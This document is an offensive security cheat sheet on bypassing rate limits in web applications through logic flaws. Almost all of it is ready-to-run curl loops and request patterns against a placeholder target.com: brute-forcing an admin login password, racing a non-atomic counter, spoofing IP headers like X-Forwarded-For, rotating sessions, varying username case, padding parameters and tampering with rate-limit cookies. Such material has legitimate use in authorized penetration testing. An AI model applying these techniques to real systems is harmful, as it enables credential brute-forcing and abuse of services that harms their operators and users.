# Rate Limit Bypass via Logic Flaws

## Summary
Identifying and exploiting logic errors in rate limit implementations.

## Rate Limit Reset on Success

```bash
# Some rate limiters reset the counter on successful requests
# This means every third attempt can be a success:

# Pattern: fail, fail, SUCCESS, fail, fail, SUCCESS...
for i in $(seq 1 100); do
  curl -X POST https://target.com/api/login \
    -d "username=admin&password=guess$i"
  # If the 3rd attempt always works → rate limit resets on success
done
```

## Race Window (TOCTOU)

```bash
# Rate limit check and increment are not atomic
# Send many requests in parallel before the counter increments

# Race the rate limit:
for i in $(seq 1 100); do
  curl -X POST https://target.com/api/send-email \
    -d "to=user$i@test.com" &
done
wait

# If more than N emails were sent → rate limit bypass via race
```

## Header Manipulation

```bash
# Many rate limiters key on IP via X-Forwarded-For header
curl -H "X-Forwarded-For: 1.1.1.1" https://target.com/api/login
curl -H "X-Forwarded-For: 1.1.1.2" https://target.com/api/login
curl -H "X-Forwarded-For: 1.1.1.3" https://target.com/api/login

# Try other IP headers:
X-Real-IP: 2.2.2.2
X-Originating-IP: 3.3.3.3
X-Remote-IP: 4.4.4.4
X-Client-IP: 5.5.5.5
CF-Connecting-IP: 6.6.6.6
True-Client-IP: 7.7.7.7
X-Forwarded-Host: 8.8.8.8

# If the server trusts any of these, you can rotate virtual IPs
```

## Session/Token Rotation

```bash
# Rate limit is per-session but server creates new sessions cheaply
# Step 1: Make request, get rate-limited
# Step 2: Get new session token
# Step 3: Continue from new session

for i in $(seq 1 100); do
  SESSION=$(curl -s https://target.com/api/new-session | jq -r ".token")
  curl -b "session=$SESSION" https://target.com/api/rate-limited-endpoint
done
```

## HTTP Method / Endpoint Variation

```bash
# Rate limit applies to POST but not GET, or vice versa
GET  /api/login?username=admin&password=guess1
GET  /api/login?username=admin&password=guess2
POST /api/login -d "username=admin&password=guess3"

# Try alternate endpoints that do the same thing
POST /api/login
POST /api/auth
POST /api/authenticate
POST /api/signin

# Rate limit may be per-endpoint but not per-user globally
```

## Lowercase / Uppercase Bypass

```bash
# If rate limit key is case-sensitive, vary case of username
admin, Admin, ADMIN, aDmin, adMin

curl -d "username=admin&password=guess1"    https://target.com/api/login
curl -d "username=Admin&password=guess2"    https://target.com/api/login
curl -d "username=ADMIN&password=guess3"    https://target.com/api/login
```

## Parameter Padding

```bash
# If rate limit key includes the full request body,
# add varying parameters to bypass:

POST /api/login -d "username=admin&password=guess1&_=1"
POST /api/login -d "username=admin&password=guess2&_=2"
POST /api/login -d "username=admin&password=guess3&_=3"

# Add random query params:
GET /api/transfer?to=attacker&amount=100&cb=1
GET /api/transfer?to=attacker&amount=100&cb=2
```

## Cookie-Based Rate Limiting

```bash
# If rate limit is tracked via a cookie:
# Step 1: Hit rate limit, receive X-RateLimit-Remaining: 0
# Step 2: Delete the rate-limit cookie
# Step 3: Continue making requests

# Also try manipulating the cookie:
X-RateLimit-Remaining: 0  →  X-RateLimit-Remaining: 999
X-RateLimit-Count: 5/5  →  X-RateLimit-Count: 0/5
```

